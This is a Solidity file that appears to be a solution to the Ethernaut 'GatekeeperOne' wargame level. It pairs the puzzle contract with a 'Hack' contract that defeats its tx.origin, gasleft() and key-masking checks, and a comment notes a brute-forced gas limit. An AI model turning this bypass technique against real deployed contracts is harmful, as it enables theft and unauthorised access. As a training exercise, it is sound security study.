// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "../node_modules/hardhat-console/contracts/console.sol";

/**
Make it past the gatekeeper and register as an entrant to pass this level.

Things that might help:
Remember what you've learned from the Telephone and Token levels.
You can learn more about the special function gasleft(), in Solidity's documentation (see here and here).
**/
contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin, "Gate1 failed");
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0, "Gate2 failed");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

interface GatekeeperI {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract Hack {

  GatekeeperI gate;

  constructor(address _add) {
    gate = GatekeeperI(_add);
  }

  function getKey() public view returns(bytes8){
    return bytes8(uint64(uint160(msg.sender))) & 0xFFFFFFFF0000FFFF;
  }

  /**
    // Gas limit should be , was forcefully calculated, by running a call until 'gasleft().mod(8191)'
    // 858737
  **/
  function hack() public {
    gate.enter(getKey());
  }

}
